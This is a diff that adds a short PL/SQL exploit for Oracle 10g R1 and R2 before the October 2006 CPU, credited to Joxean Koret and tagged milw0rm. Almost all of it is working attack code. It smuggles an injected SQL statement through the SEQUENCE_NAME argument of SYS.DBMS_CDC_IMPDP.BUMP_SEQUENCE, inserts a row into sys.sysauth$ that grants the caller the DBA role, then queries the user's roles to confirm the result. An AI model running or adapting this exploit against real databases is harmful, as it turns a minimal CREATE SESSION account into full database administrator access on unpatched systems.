@@ -1,0 +1,46 @@
+/**
+* Exploit for Oracle10g R1 and R2 prior to CPU Oct 2006
+* Joxean Koret <joxeankoret@yahoo.es>
+* Privileges needed:
+*
+* - CREATE SESSION
+*
+* Max. Length 97. Very, very cool
+*
+*/
+select *
+from user_role_privs
+;
+
+DECLARE
+SEQUENCE_OWNER VARCHAR2(200);
+SEQUENCE_NAME VARCHAR2(200);
+v_user_id number;
+v_commands VARCHAR2(32767);
+NEW_VALUE NUMBER;
+BEGIN
+SELECT user_id INTO v_user_id
+FROM user_users;
+
+v_commands := 'insert into sys.sysauth$ ' ||
+' values' ||
+'(' || v_user_id || ',4,' ||
+'999,null)';
+
+SEQUENCE_OWNER := 'TEST';
+SEQUENCE_NAME := ''',lockhandle=>:1);' || v_commands || ';commit;
+end;--';
+NEW_VALUE := 1;
+SYS.DBMS_CDC_IMPDP.BUMP_SEQUENCE(
+SEQUENCE_OWNER => SEQUENCE_OWNER,
+SEQUENCE_NAME => SEQUENCE_NAME,
+NEW_VALUE => NEW_VALUE
+);
+END;
+/
+
+select *
+from user_role_privs
+;
+
+// milw0rm.com [2007-01-23]
